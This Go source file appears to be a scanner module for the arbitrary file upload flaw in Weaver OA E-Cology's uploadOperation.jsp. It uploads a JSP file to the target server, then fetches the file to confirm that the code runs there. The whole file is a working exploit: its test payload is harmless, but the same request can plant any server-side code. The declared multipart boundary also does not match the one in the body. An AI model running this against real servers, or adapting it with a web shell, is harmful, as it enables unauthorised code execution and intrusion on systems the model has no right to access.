package ecology_fileupload

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/page/exportImport/uploadOperation.jsp"

	// 构建手动的请求体
	body := "--WebKitFormBoundary6XgyjB6SeCArD3Hc\r\n"
	body += "Content-Disposition: form-data; name=\"file\"; filename=\"test123.jsp\"\r\n"
	body += "Content-Type: application/octet-stream\r\n\r\n"
	body += "<%out.print(\"test\");%>\r\n"
	body += "--WebKitFormBoundary6XgyjB6SeCArD3Hc--\r\n"

	// 发送POST请求
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc",
		}).
		SetBodyString(body).
		Post(vulnUrl)

	if err != nil || resp.StatusCode != 200 {
		return false
	}

	// 第二个GET请求
	testUrl := url + "/page/exportImport/fileTransfer/test123.jsp"
	testResp, testErr := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(testUrl)

	if testErr == nil && testResp.StatusCode == 200 && strings.Contains(testResp.String(), "test") {
		return true
	}

	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		testUrl := url + "/page/exportImport/fileTransfer/test123.jsp"
		color.Green.Println("[+06] 泛微OA E-Cology uploadOperation.jsp 任意文件上传漏洞存在 -> ", testUrl)
	} else {
		color.Red.Println("[-06] 泛微OA E-Cology uploadOperation.jsp 任意文件上传漏洞不存在")
	}
}
